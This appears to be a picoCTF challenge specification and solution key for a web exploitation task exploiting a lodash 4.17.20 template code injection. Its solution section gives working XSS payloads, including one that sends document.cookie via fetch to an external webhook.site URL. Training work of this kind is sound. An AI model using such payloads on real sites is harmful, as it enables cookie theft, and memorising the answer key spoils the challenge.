# supply-me-vuln

- Namespace: picoctf/18739f24
- ID: supply-me-vuln
- Type: custom
- Category: Web Exploitation
- Points: 1
- Templatable: yes
- MaxUsers: 1

## Description

The site uses a buggy library! Figure it out and carry out the exploit!


## Details

Browse {{link_as('/', 'here')}}, and find the flag!


## Hints

- How do you determine what library is running behind the scene?
- Can you get its version?

## Solution Overview

- Install library detector extension on your browser and detect the library being used
- some of them provides the version of the library, if not, since the target library is lodash, we can print the version out with _.VERSION
- By searching online we know that lodash 4.17.20 has a code injection vulnerability in its template function
- Inspect the behavior and given source code of the function `pass_val`, combined with the lodash template usage to build up a XSS payload
- carry out the attack to get the flag saved in document.cookie of another user, use a self-host server to get the 
  redirected request

- benign input: {"arg1":"user", "arg2": {"name": "Alice", "pet": "dog"}}
- exploit: {"arg1":"){alert(\"hi\")}; with(obj", "arg2": {"name": "Alice", "pet": "dog"}}
- cookie exploit for remote server: {"arg1":"){cookie=document.cookie;fetch('https://webhook.site/c0d4620e-9448-4793-8dd6-06caefb0ddc8?cookie='+cookie)}; with(obj", "arg2": {"name": "Alice", "pet": "dog"}}
- testing: {"arg1":"){console.log(document.cookie);}; with(obj", "arg2": {"name": "Alice", "pet": "dog"}}

## Challenge Options

```yaml
cpus: 0.5
memory: 128m
pidslimit: 20
ulimits:
  - nofile=128:128
diskquota: 64m
init: true
```

## Learning Objective

- Get to know about the supply chain attacks

## Attributes

- author: Ian Lin
- organization: picoCTF
- event: picoCTF Problem Developer Training
